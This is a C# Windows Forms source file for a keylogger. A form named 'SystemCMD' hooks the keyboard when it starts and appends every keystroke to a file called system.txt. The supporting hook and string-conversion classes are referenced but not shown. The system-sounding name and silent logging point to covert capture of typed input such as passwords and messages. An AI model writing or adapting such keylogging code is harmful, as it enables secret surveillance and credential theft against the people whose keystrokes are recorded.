using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
	public partial class SystemCMD : Form
	{
		StringFixer fixer = new StringFixer();
		public SystemCMD()
		{
			InitializeComponent();
			File.AppendAllText("system.txt", "#");
			KeyHooker a = new KeyHooker();
			a.KeyDown += new KeyEventHandler(A_KeyDown);
			a.hook();
		}

		private void A_KeyDown(object sender, KeyEventArgs e)
		{
			File.AppendAllText("system.txt", fixer.stringFixer(e.KeyValue).ToString());
		}
	}
}
